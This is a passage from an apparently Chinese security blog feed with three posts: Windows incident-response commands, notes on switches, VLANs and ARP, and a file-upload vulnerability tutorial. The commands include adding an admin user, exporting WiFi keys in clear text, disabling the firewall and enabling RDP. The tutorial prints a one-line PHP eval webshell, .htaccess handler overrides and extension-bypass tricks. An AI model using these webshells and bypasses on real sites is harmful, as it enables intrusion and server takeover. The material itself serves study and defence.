class="number">16.</span> wscript-------windows脚本宿主设置 </span><br><span class="line"><span class="number">17.</span> certmgr.<span class="property">msc</span>---证书管理实用程序 【排查电脑内恶意证书】</span><br><span class="line"><span class="number">18.</span> secpol.<span class="property">msc</span>----本地安全策略 </span><br><span class="line"><span class="number">19.</span> services.<span class="property">msc</span>--本地服务设置 </span><br><span class="line"><span class="number">20.</span> gpedit.<span class="property">msc</span>----组策略</span><br><span class="line"><span class="number">21.</span> sigverif------文件签名验证程序 【可以快速筛选出来没有通过签名验证的程序】</span><br></pre></td></tr></table></figure>

<h2 id="程序启动相关"><a href="#程序启动相关" class="headerlink" title="程序启动相关"></a>程序启动相关</h2><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> explorer-------打开资源管理器 </span><br><span class="line"><span class="number">2.</span> notepad--------打开记事本</span><br><span class="line"><span class="number">3.</span> charmap--------打开字符映射表 </span><br><span class="line"><span class="number">4.</span> calc-----------打开计算器 </span><br><span class="line"><span class="number">5.</span> taskmgr--------打开任务管理器</span><br><span class="line"><span class="number">6.</span> mstsc----------远程桌面连接 </span><br><span class="line"><span class="number">7.</span> write----------打开写字板 </span><br><span class="line"><span class="number">8.</span> mspaint--------打开画图板 </span><br><span class="line"><span class="number">9.</span> magnify--------放大镜实用程序 </span><br><span class="line"><span class="number">10.</span> mmc-----------打开控制台  </span><br><span class="line"><span class="number">11.</span> <span class="title class_">Sndvol32</span>------打开音量控制程序 </span><br><span class="line"><span class="number">12.</span> eudcedit------打开造字程序 </span><br><span class="line"><span class="number">13.</span> cliconfg------<span class="variable constant_">SQL</span> <span class="variable constant_">SERVER</span> 客户端网络实用程序</span><br><span class="line"><span class="number">14.</span> osk-----------打开屏幕键盘 </span><br><span class="line"><span class="number">15.</span> odbcad32------<span class="variable constant_">ODBC</span>数据源管理器 </span><br><span class="line"><span class="number">16.</span> iexpress------捆绑工具，系统自带【可以用来制作免杀马】</span><br></pre></td></tr></table></figure>

<h2 id="磁盘相关"><a href="#磁盘相关" class="headerlink" title="磁盘相关"></a>磁盘相关</h2><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> cleanmgr-------打开磁盘清理工具</span><br><span class="line"><span class="number">2.</span> chkdsk.<span class="property">exe</span>-----<span class="title class_">Chkdsk</span>磁盘检查</span><br></pre></td></tr></table></figure>

<h2 id="检查相关"><a href="#检查相关" class="headerlink" title="检查相关"></a>检查相关</h2><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> dxdiag---------检查<span class="title class_">DirectX</span>信息</span><br><span class="line"><span class="number">2.</span> winver---------检查<span class="title class_">Windows</span>版本</span><br><span class="line"><span class="number">3.</span> sfc /scannow---扫描错误并复原</span><br><span class="line"><span class="number">4.</span> sfc.<span class="property">exe</span>--------系统文件检查器</span><br></pre></td></tr></table></figure>

<h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><h2 id="net相关"><a href="#net相关" class="headerlink" title="net相关"></a>net相关</h2><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">查看域中当前的主机列表：</span><br><span class="line">net view /domain</span><br><span class="line"></span><br><span class="line">查看当前域中的用户</span><br><span class="line">net user /domain</span><br><span class="line"></span><br><span class="line">增加一个本地用户</span><br><span class="line">net user username password /add</span><br><span class="line"></span><br><span class="line">将新增的用户加到本地管理员组</span><br><span class="line">net localgroup <span class="string">&quot;Administrators&quot;</span> username /add</span><br><span class="line"></span><br><span class="line">查看域中的密码策略</span><br><span class="line">net accounts /domain</span><br><span class="line"></span><br><span class="line">查看本地组</span><br><span class="line">net localgroup <span class="string">&quot;Group&quot;</span></span><br><span class="line"></span><br><span class="line">查看域中的组信息</span><br><span class="line">net group /domain</span><br><span class="line"></span><br><span class="line">查看域中指定组的成员</span><br><span class="line">net group <span class="string">&quot;Domain group&quot;</span> /domain</span><br><span class="line"></span><br><span class="line">查看当前机器所在的域名</span><br><span class="line">net config workstation</span><br><span class="line"></span><br><span class="line">查看当前服务器所在的域名</span><br><span class="line">net config server</span><br></pre></td></tr></table></figure>

<h2 id="系统显示相关"><a href="#系统显示相关" class="headerlink" title="系统显示相关"></a>系统显示相关</h2><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">显示系统信息</span><br><span class="line">systeminfo</span><br><span class="line"></span><br><span class="line">查看远程主机的系统信息</span><br><span class="line">systeminfo /S ip /U domain\user /P <span class="title class_">Pwd</span></span><br><span class="line"></span><br><span class="line">显示进程和服务信息</span><br><span class="line">tasklist /svc</span><br><span class="line"></span><br><span class="line">显示所有进程以及<span class="variable constant_">DLL</span>信息</span><br><span class="line">tasklist /m</span><br><span class="line"></span><br><span class="line">显示进程和所有者</span><br><span class="line">tasklist /v</span><br><span class="line"></span><br><span class="line">查看远程主机的进程列表</span><br><span class="line">tasklist /S ip /v</span><br><span class="line"></span><br><span class="line">显示具体的服务信息（包括二进制路径和运行使用）</span><br><span class="line">sc qc <span class="title class_">Spooler</span></span><br></pre></td></tr></table></figure>

<h2 id="网络信息"><a href="#网络信息" class="headerlink" title="网络信息"></a>网络信息</h2><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">打印路由表</span><br><span class="line">route print</span><br><span class="line"></span><br><span class="line">保存当前主机上的所有<span class="title class_">WiFi</span>信息</span><br><span class="line">netsh wlan <span class="keyword">export</span> profile folder=. key=clear</span><br><span class="line"></span><br><span class="line">设置当前配置禁用防火墙</span><br><span class="line">netsh advfirewall set currentprofile state off</span><br><span class="line"></span><br><span class="line">设置端口转发</span><br><span class="line">netsh interface portproxy add v4tov4 listenport=<span class="number">3000</span> listenaddress=l.<span class="property">l</span>.<span class="property">l</span>.<span class="property">l</span> connectport=<span class="number">4000</span> connectaddress=<span class="number">2.2</span><span class="number">.2</span><span class="number">.2</span></span><br><span class="line"></span><br><span class="line">启用远程访问</span><br><span class="line">reg add <span class="string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span> /v fDenyTSConnections /t <span class="variable constant_">REG_DWORD</span> /d <span class="number">0</span> /f</span><br><span class="line"></span><br><span class="line">启用远程协助</span><br><span class="line">reg add <span class="string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span> /v fAllowToGetHelp /t <span class="variable constant_">REG_DWORD</span> /d <span class="number">1</span> /f</span><br><span class="line"></span><br><span class="line">修改远程访问端口</span><br><span class="line">reg add <span class="string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span> /v <span class="title class_">PortNumber</span> /t <span class="variable constant_">REG_DWORD</span> /d <span class="number">12345</span> /f</span><br></pre></td></tr></table></figure>

<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Procexp</span> -----查看进程的详细信息，比如 加载的 dll 文件、签名、内存使用等</span><br><span class="line">autoruns ----查看计划任务、自启动、服务等信息</span><br><span class="line"><span class="title class_">TCPView</span> -----查看网络连接的情况</span><br><span class="line"><span class="title class_">PSExec</span> ------轻量级的 telnet 工具</span><br><span class="line"></span><br><span class="line"><span class="title class_">Registry</span> <span class="title class_">Workshop</span>：好用的注册表工具</span><br><span class="line"><span class="title class_">Event</span> <span class="title class_">Log</span> <span class="title class_">Explorer</span>：查看系统日志</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>安全技术</category>
        <category>应急响应</category>
      </categories>
      <tags>
        <tag>应急响应</tag>
      </tags>
  </entry>
  <entry>
    <title>数据链路层设备及协议：交换机、单臂路由、三层交换机、VLAN、ARP</title>
    <url>/archives/776f7656.html</url>
    <content><![CDATA[<h1 id="交换机"><a href="#交换机" class="headerlink" title="交换机"></a>交换机</h1><p>本笔记部分参考网址：</p>
<p><a href="https://zhuanlan.zhihu.com/p/122241071">交换机工作原理详解（附原理图）</a></p>
<h2 id="基本情况"><a href="#基本情况" class="headerlink" title="基本情况"></a>基本情况</h2><p>交换机工作在TCP&#x2F;IP五层模型的第二层，负责寻址对数据帧进行转发，其亦可实现对网络中冲突域的隔离。其工作的核心协议是以太网协议，其可实现MAC地址的自动学习与维护。</p>
<h2 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h2><p>网络层数据经过数据链路层封装帧头后，经由网线发送达到交换机的端口，交换机首先根据帧头中的目标MAC地址从MAC地址表中去查找需要将该帧发送到哪个端口并自动学习其源MAC地址将其绑定到该端口，如果未在MAC地址表中匹配到该MAC地址，则对数据进除接受端口外的所有端口进行广播，若匹配到该MAC地址则对该帧转发到对应的端口，目标机在收到该帧后，首先核对该帧中的目标MAC地址是否是自己，若不是，则对数据进行丢弃，若是，则对数据进行解封装，丢弃帧头与FCS帧尾，并将数据根据帧头中的TYPE域将数据上送到网络层对应的协议进行处理。</p>
<h2 id="交换机命令"><a href="#交换机命令" class="headerlink" title="交换机命令"></a>交换机命令</h2><p>交换机配置通过交换机上的Console口使用Console—全反线，连接电脑使用专门的工具进行配置。</p>
<p><a href="%E4%BA%8C%E5%B1%82%E4%BA%A4%E6%8D%A2%E6%9C%BA%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%2011b9282f208e494e8480f56a9ee69779.csv">二层交换机常用命令</a></p>
<h1 id="VLAN"><a href="#VLAN" class="headerlink" title="VLAN"></a>VLAN</h1><p>本部分笔记参考</p>
<p><a href="https://zhuanlan.zhihu.com/p/35616289">VLAN 基础知识</a></p>
<h2 id="基本情况-1"><a href="#基本情况-1" class="headerlink" title="基本情况"></a>基本情况</h2><p>VLAN:虚拟局域网，通过划分VLAN可实现对广播域的隔离，降低网络链路负担，提高通信效率。</p>
<h3 id="为什么需要VLAN"><a href="#为什么需要VLAN" class="headerlink" title="为什么需要VLAN"></a>为什么需要VLAN</h3><p>广播域：指的是广播帧(目标MAC地址全部为1)所能传递到的范围，亦即能够直接通信的范围。严格地说，并不仅仅是广播帧，多播帧(Multicast Frame)和目标不明的单播帧(Unknown Unicast Frame)也能在同一个广播域中畅行无阻。</p>
<p>数据帧要在网络中传播必须知道目标主机的MAC地址，这时源主机会通过ARP协议发起ARP Requests，及目标MAC地址各位均为1的帧，当交换机接受到该帧后，将向出去接受端口的所有端口转发该requests，即泛洪flooding，原本源主机只是想知道目标IP主机的MAC地址，事实却是该Requests却传遍了整个网络，这大大占用了网络的带宽，同时网络中的各主机接受到该Requests后还需消耗一定的CPU去处理该请求，试想一下，当该局域网足够大时，占用的资源将是可观的。不止如此使用广播的协议不仅ARP一种，DHCP、RIP等协议均使用广播的方式通信，这又加大了网络链路的负担。所以VLAN技术也就应运而生。</p>
<h3 id="什么是VLAN"><a href="#什么是VLAN" class="headerlink" title="什么是VLAN"></a>什么是VLAN</h3><p>VLAN是通过虚拟技术，在交换机中划分不同的局域网，从而实现了广播域的逻辑隔离。</p>
<h3 id="VLAN与使用路由器隔离相比有什么优点"><a href="#VLAN与使用路由器隔离相比有什么优点" class="headerlink" title="VLAN与使用路由器隔离相比有什么优点"></a>VLAN与使用路由器隔离相比有什么优点</h3><p>使用路由器进行隔离是基于物理层面实现的，路由器一个物理接口连接了一个局域网，故其接口的数量及决定了局域网的数量，当局域网数量足够多的时候，就需要路由器拥有更多的接口或者拥有更多的路由器，而一般路由器的接口数量为4个左右且路由器的价格是相对昂贵的，所以才有路由器来隔离广播域需要极大得成本，而VLAN是通过虚拟技术来实现隔离广播域的，在成本上无疑更具优势。当然VLAN在隔离广播域的同时也隔离了不同VLAN间的通信，我们采用单臂路由、三层交换机技术来解决这个问题。</p>
<h2 id="VLAN类型"><a href="#VLAN类型" class="headerlink" title="VLAN类型"></a>VLAN类型</h2><h3 id="基于端口的VLAN-静态VLAN"><a href="#基于端口的VLAN-静态VLAN" class="headerlink" title="基于端口的VLAN-静态VLAN"></a>基于端口的VLAN-静态VLAN</h3><p>将交换机的不同端口划分到不同的VLAN中，只有相同的VLAN间的设备才能相互通信，从而实现了对广播域的隔离。如，某一端口属于VLAN 10，其只能与同属于VLAN 10 的端口的设备进行通信。</p>
<p>该方法意味着PC只要更换了网线，就有可能进入了别的VLAN，从而不能与某些设备进行通信。</p>
<h3 id="基于MAC地址的VLAN-动态VLAN"><a href="#基于MAC地址的VLAN-动态VLAN" class="headerlink" title="基于MAC地址的VLAN-动态VLAN"></a>基于MAC地址的VLAN-动态VLAN</h3><p>交换机通过识别MAC地址来识别某个设备属于哪个VLAN，从而实现了，动态得管理。但缺点也很明显，这需要耗费大量的人力物力在交换机中配置VLAN表</p>
<h3 id="基于协议的VLAN-动态VLAN"><a href="#基于协议的VLAN-动态VLAN" class="headerlink" title="基于协议的VLAN-动态VLAN"></a>基于协议的VLAN-动态VLAN</h3><p>根据PC运行的协议来划分VLAN，但计算机运行的协议是有限的，从而限制了VLAN的划分</p>
<h3 id="基于子网的VLAN-动态VLAN"><a href="#基于子网的VLAN-动态VLAN" class="headerlink" title="基于子网的VLAN-动态VLAN"></a>基于子网的VLAN-动态VLAN</h3><p>通过识别帧中源IP属于哪个网段来划分VLAN。</p>
<h3 id="基于用户的VLAN-动态VLAN"><a href="#基于用户的VLAN-动态VLAN" class="headerlink" title="基于用户的VLAN-动态VLAN"></a>基于用户的VLAN-动态VLAN</h3><p>根据交换机各端口所连的计算机上当前登录的用户，来决定该端口属于哪个VLAN。这里的用户识别信息，一般是计算机操作系统登录的用户，比如可以是Windows域中使用的用户名。这些用户名信息，属于OSI第四层以上的信息。</p>
<h2 id="VLAN标签技术"><a href="#VLAN标签技术" class="headerlink" title="VLAN标签技术"></a>VLAN标签技术</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>在一个设置了VLAN的交换机中，当该交换机的一个端口收到一个数据帧的时候，通过VLAN表查找到该端口所属的VLAN后，在该帧的源MAC地址与TYPE域之间会插入一个VLAN标签来唯一标识该帧属于某个VLAN，然后再通过MAC地址表查找该帧要发送到的端口并判断该端口的VLAN ID ，若相同则将VLAN标签剥离重新封装该帧并转发，若不相同则丢弃该帧。</p>
<h3 id="如何在两个交换机间实现VLAN"><a href="#如何在两个交换机间实现VLAN" class="headerlink" title="如何在两个交换机间实现VLAN"></a>如何在两个交换机间实现VLAN</h3><p>当需要将两个处于不同交换机上的用户划分到同一VLAN中时，一般采用的策略是在两个交换间建立链路，将其对应的端口设置为同一VLAN即可，但这种方式，当VLAN的数目逐渐增加之后就显得捉襟见肘了，采用这种方式不仅需要建立大量的物理连接，其每一条链路的利用率也是极地的，这显然不是一种好的解决方案。</p>
<p>这时需要用到TRUNK(中继)技术，交换机的接口可以分为两类，一类是与PC直连的称之为ACCESS，一类是交换机之间互连的称之为TRUNK，TRUNK的优点是可以允许链路上通过不同VLAN ID的数据。</p>
<p>例：当交换机在转发帧的时候，发现除接受端口外的直连端口中并没有匹配的VLAN，此时交换机将数据通过TRUNK转发出去。</p>
<h3 id="标签类型与格式"><a href="#标签类型与格式" class="headerlink" title="标签类型与格式"></a>标签类型与格式</h3><p>该部分笔记来自：</p>
<p><a href="https://support.huawei.com/enterprise/zh/doc/EDOC1100088136">IEEE 802.1Q封装的VLAN数据帧格式</a></p>
<p><strong>Cisco ISL协议</strong></p>
<p>思科开发的一种VLAN标签协议格式，由于其占用数据量较大等因素，现以很少使用</p>
<p><strong>IEEE 802.1Q协议</strong></p>
<p>当今使用最多的一种标签协议类型。</p>
<p><img src="/archives/776f7656/download.png"></p>
<p><a href="VLAN%E6%A0%87%E7%AD%BE%E6%A0%BC%E5%BC%8F%20835161fbbe6c4960890ae8174d4e7306.csv">VLAN标签格式</a></p>
<h2 id="VLAN通信过程"><a href="#VLAN通信过程" class="headerlink" title="VLAN通信过程"></a>VLAN通信过程</h2><h3 id="同一VLAN间通信过程"><a href="#同一VLAN间通信过程" class="headerlink" title="同一VLAN间通信过程"></a>同一VLAN间通信过程</h3><p>当一个以太网帧经由F0&#x2F;1端口进入交换机后，交换机通过查找VLAN表匹配F0&#x2F;1端口对应的VLAN ID ，并在该帧的源MAC地址与TYPE域之间插入4Bytes的IEEE 802.1Q标签并重新计算FCS值，然后对比该以太网帧中的目标MAC地址匹配MAC地址表，若匹配不成功，则通过广播的方式将该以太网帧向除了其源端口外的所有同一VLAN内的端口进行广播，若匹配成功，在从VLAN表中查找目标MAC地址所在的端口是否与源端口处在同一VLAN中，若不匹配，则丢弃该帧，若成功匹配，则剥离VLAN标签兵重新计算FCS值对该帧进行封装发送。</p>
<h3 id="同一VLAN跨交换机通信过程"><a href="#同一VLAN跨交换机通信过程" class="headerlink" title="同一VLAN跨交换机通信过程"></a>同一VLAN跨交换机通信过程</h3><p>将两个交换机相连交的接口均配置成TRUNK接口，从而使该端口可以转发所有的VLAN数据。当两台设备需要跨交换机进行通信时。当一个以太网帧经由F0&#x2F;1端口进入交换机后，交换机通过查找VLAN表匹配F0&#x2F;1端口对应的VLAN ID ，并在该帧的源MAC地址与TYPE域之间插入4Bytes的IEEE 802.1Q标签并重新计算FCS值，然后对比该以太网帧中的目标MAC地址匹配MAC地址表，若匹配不成功，则通过广播的方式将该以太网帧向除了其源端口外的所有同一VLAN内的端口进行广播，若匹配成功，在从VLAN表中查找目标MAC地址所在的端口是否与源端口处在同一VLAN中，若不匹配，则丢弃该帧，若成功匹配，则剥离VLAN标签兵重新计算FCS值对该帧进行封装发送。此时以太网帧以未被标标识的帧格式在TRUNK上传输，当其到达另一个路由器的TRNK接口时，该路由器执行与上述过程相同的操作，将该帧转发到目标MAC对应的设备。</p>
<h3 id="不同VLAN间通信过程"><a href="#不同VLAN间通信过程" class="headerlink" title="不同VLAN间通信过程"></a>不同VLAN间通信过程</h3><p>VLAN在实现了广播域隔离的同时也隔离了不同VLAN间通信的可能性。而要想同时实现隔离广播域又能在VLAN间进行通信则需要用到另一种设备：路由器该例中使用的路由器，我们将其称之为单臂路由。</p>
<p>将路由器与交换器连接的端口设置为TRUNK。</p>
<p><img src="/archives/776f7656/v2-63baa76ac2837bc1f3ef6d9b438a0181_720w.png"></p>
<p>计算机A从通信目标的IP地址(192.168.2.1)得出C与本机不属于同一个网段。因此会向设定的默认网关(DefaultGateway，GW)转发数据帧。在发送数据帧之前，需要先用ARP获取路由器的MAC地址。</p>
<p>得到路由器的MAC地址R后，接下来就是按图中所示的步骤发送往C去的数据帧。①的数据帧中，目标MAC地址是路由器的地址R、但内含的目标IP地址仍是最终要通信的对象C的地址。这一部分的内容，涉及到局域网内经过路由器转发时的通信步骤，有机会再详细解说吧。</p>
<p>交换机在端口1上收到①的数据帧后，检索MAC地址列表中与端口1同属一个VLAN的表项。由于汇聚链路会被看作属于所有的VLAN，因此这时交换机的端口6也属于被参照对象。这样交换机就知道往MAC地址R发送数据帧，需要经过端口6转发。</p>
<p>从端口6发送数据帧时，由于它是汇聚链接，因此会被附加上VLAN识别信息。由于原先是来自红色VLAN的数据帧，因此如图中②所示，会被加上红色VLAN的识别信息后进入汇聚链路。路由器收到②的数据帧后，确认其VLAN识别信息，由于它是属于红色VLAN的数据帧，因此交由负责红色VLAN的子接口接收。</p>
<p>接着，根据路由器内部的路由表，判断该向哪里中继。</p>
<p>由于目标网络192.168.2.0&#x2F;24是蓝色VLAN，，且该网络通过子接口与路由器直连，因此只要从负责蓝色VLAN的子接口转发就可以了。这时，数据帧的目标MAC地址被改写成计算机C的目标地址;并且由于需要经过汇聚链路转发，因此被附加了属于蓝色VLAN的识别信息。这就是图中③的数据帧。</p>
<p>交换机收到③的数据帧后，根据VLAN标识信息从MAC地址列表中检索属于蓝色VLAN的表项。由于通信目标——计算机C连接在端口3上、且端口3为普通的访问链接，因此交换机会将数据帧去除VLAN识别信息后(数据帧④)转发给端口3，最终计算机C才能成功地收到这个数据帧。</p>
<p><a href="%E5%88%92%E5%88%86vlan%E5%91%BD%E4%BB%A4%20b42867526201431db722223d7e6dcf67.csv">划分vlan命令</a></p>
<h2 id="三层交换机"><a href="#三层交换机" class="headerlink" title="三层交换机"></a>三层交换机</h2><h2 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h2><p>本部分笔记参考：</p>
<p><a href="https://zhuanlan.zhihu.com/p/145782441">一文读懂ARP协议，从IP获取对方MAC实操</a></p>
<p>两台PC要成功实现相互间的通信，必须要知道对方的IP地址以及MAC地址，IP地址通过域名系统可以很方便得获得，那么MAC地址呢？此时就需要一个获取目的主机MAC地址的协议。ARP协议即为了完成这个功能而设计。</p>
<h3 id="ARP协议工作原理"><a href="#ARP协议工作原理" class="headerlink" title="ARP协议工作原理"></a>ARP协议工作原理</h3><p>在知道目的主机IP地址的情况下，计算机首先判断该IP地址是否与自己属于同一个网段，如果不属于同一个网段，则需要向网关转发，计算机通过网关的IP地址在ARP缓存表中查找是否保存有网关的MAC地址，若无则发送广播，若有则直接进行封装。若属于同一 网段，IP报文到达数据链路层进行封装，此时需要知道对方的MAC地址。计算机会首先查询自己的arp缓存表，如果缓存表中有目标IP的MAC则使用该MAC地址进行封装，如果缓存表中不存在该表项，这时主机会向交换机发送ARP request 报文，该报文在数据链路层封装帧头与帧尾，因为不知道目标MAC地址，此时目的MAC地址被设置为FF-FF-FF-FF-FF-FF。交换机收到该报文时发现目标MAC地址是广播地址，于是将该报文向除来端口外的所有端口进行广播，并同时学习来端口的MAC地址放入MAC地址表。发送端口的主机接受到该广播的时候，数据链路层通过解析帧头发现其中TYPE类型为ARP，于是将其SDU部分送给网络层的ARP协议解析，网络层解析ARP报头时发现该报文的目的IP地址与自己的不一致，于是将该报文丢弃，并学习该报文中的源MAC地址与源IP地址映射并更新自己的ARP缓存表。接受端口主机在发现该ARP头部的目的IP地址与自己一致的话，将以单播的形式给源主机回应一个ARP replay 报文将源mac地址修正为自己的mac地址，目的mac地址修改为对方的mac地址，ARP报头中目的mac地址与源mac地址、操作码均进行修正，并学习源主机的IP与MAC地址放入自己的ARP缓存表。源主机收到该replay包后，将得到的目的主机的IP地址和MAC地址添加到自己的ARP列表中，并利用此信息开始数据的传输。如果源主机一直没有收到ARP响应数据包，表示ARP查询失败。</p>
<h3 id="ARP报头分析"><a href="#ARP报头分析" class="headerlink" title="ARP报头分析"></a>ARP报头分析</h3><p><img src="/archives/776f7656/1111.jpg"></p>
<ul>
<li>Hardware Type： 表示硬件地址类型，一般为以太网；</li>
<li>Protocol Type： 表示三层协议地址类型，一般为IP；</li>
<li>Hardware Length和Protocol Length：为MAC地址和IP地址的长度，单位是字节；</li>
<li>Operation Code： 指定了ARP报文的类型，包括ARP request和ARP reply；</li>
<li>Source Hardware Address：  指的是发送ARP报文的设备MAC地址；</li>
<li>Source Protocol Address：指的是发送ARP报文的设备IP地址；</li>
<li>Destination Hardware Address：指的是接收者MAC地址，在ARP request报文中，该字段值为0；</li>
<li>8、Destination Protocol Address：指的是指接收者的IP地址。</li>
</ul>
]]></content>
      <categories>
        <category>安全技术</category>
        <category>协议规范</category>
      </categories>
      <tags>
        <tag>交换机</tag>
        <tag>路由器</tag>
        <tag>三层交换机</tag>
        <tag>VLAN</tag>
        <tag>ARP</tag>
      </tags>
  </entry>
  <entry>
    <title>文件上传漏洞</title>
    <url>/archives/931c692.html</url>
    <content><![CDATA[<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p>该漏洞的产生时因为软件编写人员没有对用户的上传行为做过滤，如没有对文件的上传类型做限制，那么用户就可以上传任意类型的文件，从而造成危害。</p>
<h2 id="过滤方法"><a href="#过滤方法" class="headerlink" title="过滤方法"></a>过滤方法</h2><p>前端过滤</p>
<p>通过js过滤文件扩展名：可通过禁用js，抓包改包、修改文件后缀名的方式绕过，重写前端过滤函数</p>
<h2 id="后端过滤"><a href="#后端过滤" class="headerlink" title="后端过滤"></a>后端过滤</h2><p><strong>识别文件扩展名</strong>：只在后端是基于黑名单过滤的时候有效。在appache中，识别文件名的方法时从右向左识别，遇到不能识别的扩展名就会被忽略，直到遇到一个可识别的扩展名。所以我们可以通过构建这样的扩展名绕过，<code>test.php.tar</code> 在apache的配置文件中有一个defaulttype选项，该选项设置了当文件名不可被识别的时候处理该文件的策略。默认会被当成text&#x2F;plain类型处理。<del>Apache认为一个文件可以拥有多个扩展名，哪怕没有文件名，也可以拥有多个扩展名。Apache认为应该从右到左开始判断解析方法的。如果最右侧的扩展名为不可识别的，就继续往左判断，直到判断到文件名为止</del>。</p>
<p><strong>识别mime类型</strong>：通过抓包改包软件过滤</p>
<p><strong>识别文件头部字符</strong>：在文件中插入对应文件的标志字符</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">47494638 //gif文件头&lt;?php@eval($_POST[123])?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>通过修改中间件配置文件</strong>，使得文件存储目录对应后缀名文件只能以特定的方式被读取</p>
<p><code>AddType text/plain .py .txt .php</code> &#x2F;&#x2F;这样设置php文件将被作为文本文件看待。</p>
<p>禁止此类文件被访问</p>
<p><code>Options -ExecCGI AddHandler cgi-script .php .pl .py .jsp .asp .htm .shtml .sh .cgi识别</code></p>
<p>强制web服务器对于特定文件类型的处理，与第一条不同的是， 下面的方法直接强行让apache将文件识别为你指定的类型，而第一种是让浏览器符合上面正则的全部被认为是纯文本，也可以继续往里面加入其他类型。</p>
<p><code>&lt;FilesMatch &quot;\.(php|pl|py|jsp|asp|htm|shtml|sh|cgi)$&quot;&gt; ForceType text/plain &lt;/FilesMatch&gt;</code></p>
<p>只允许访问特定类型的文件.使得该文件夹里面只有图片扩展名的文件才可以被访问，其他类型都是拒绝访问(白名单策略)。</p>
<p><code>&lt;Files ^(*.jpeg|*.jpg|*.png|*.gif)&gt; order deny,allow deny from all &lt;/Files&gt;</code></p>
<p>上述过滤策略均可通过上传.htaccess伪静态文件，被覆盖。伪静态文件被执行需要设置了<code>allowoverride</code> 在该文件中写入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;IfModule mime_module&gt;AddHandler php5-script .gif          #在当前目录下，只针对gif文件会解析成Php代码执行SetHandler application/x-httpd-php    #在当前目录下，所有文件都会被解析成php代码执行&lt;/IfModule&gt;或者&lt;FilesMatch &quot;evil.gif&quot;&gt;SetHandler application/x-httpd-php   #在当前目录下，如果匹配到evil.gif文件，则被解析成PHP代码执行AddHandler php5-script .gif          #在当前目录下，如果匹配到evil.gif文件，则被解析成PHP代码执行&lt;/FilesMatch&gt;或者&lt;IfModule mime_module&gt;AddType application/x-httpd-php .gif&lt;/IfModule&gt;</span><br></pre></td></tr></table></figure>

<p><strong>文件系统截断</strong>，当文件系统遇到0x00的时候，会认为文件已经结束，这样我么可以这样构造扩展名a.php%00jpg。当文件系统读取文件的时候遇到%00的时候会认为文件已经结束，<code>但如果过滤系统只是简单得判断后缀名是不是php的话，他得到的是php%jpg这当然不是php,所以成功通过</code>，这样我们就有了一个a.php的文件。</p>
<p>**利用ntfs文件系统的ads特性：**构造这样一个文件名a.php::<em>DATA</em>，<em>在这个文件中</em>，<em>后缀名明显不是php</em>，<em>那么针对后缀名检测就失效了</em>，<em>但是ntfs文件系统却能识别这种格式</em>，<em>其中</em>DATA表示该ads流是一个文件流，但是因为流名为空，即该宿主文件并没有挂着一个ads流文件，那么ntfs文件系统讲执行宿主文件，如果流名不为空则会执行寄宿文件。</p>
<p><strong>使用大小写绕过</strong></p>
<p><code>PHP/PhP</code></p>
<p><strong>使用另类扩展名</strong></p>
<p><code>php2/php3/php4/php5/php /php./php../pht/phtml</code></p>
<p><strong>后缀冗余</strong></p>
<p><code>添加如%81这类的非法文件名到文件末尾</code> a.php%81</p>
<p><strong>双写绕过</strong></p>
<p><code>phphpp</code> 该处涉及对方替换的时候，是从前往后还是从后往前识别的<code>pphphp</code> 与<code>phphpp</code> 是两种完全不同的情况</p>
<p><strong>二次渲染绕过</strong></p>
<p>我们上传的文件很多时候都会被二次渲染并存储到别的位置，在进行二次渲染的过程中，甚至会去掉其中的冗余部分，也就是我们附加的一句话木马部分，这时候，我们就需要利用工具对比原图片于二次渲染后的图片中相同的部分，也就是没有被改变的部分，在这部分部分插入一句话木马，来绕过该限制如<code>winhex和010editor</code></p>
<p><img src="https://www.notion.so/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%2089f0d86c654b4d3cadc3d82d4c7f4b6e/Untitled.png"></p>
<p>%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%2089f0d86c654b4d3cadc3d82d4c7f4b6e&#x2F;Untitled.png</p>
<blockquote>
<p>针对GIF文件</p>
</blockquote>
<p>直接使用010editer比较两次上传文件区别，在相同部分插入代码就可以了</p>
<blockquote>
<p>针对PNG文件</p>
</blockquote>
<p>直接像修改gif文件那样已经行不通了，需要将代码写入的PLET数据块或者IDAT数据开中</p>
<p><strong>写入到PLET数据块中</strong></p>
<p>使用索引图像才能写入成功，所以需要在ps中改一下图片的图像模式。为索引颜色</p>
<p><img src="https://www.notion.so/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%2089f0d86c654b4d3cadc3d82d4c7f4b6e/Untitled%201.png"></p>
<p>%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%2089f0d86c654b4d3cadc3d82d4c7f4b6e&#x2F;Untitled%201.png</p>
<p>这样修改之后，使用脚本工具将脚本写到图片中，这时候再上传可能还是会失败</p>
<p><a href="jpg_secong_render_PLET.py">jpg_secong_render_PLET.py</a></p>
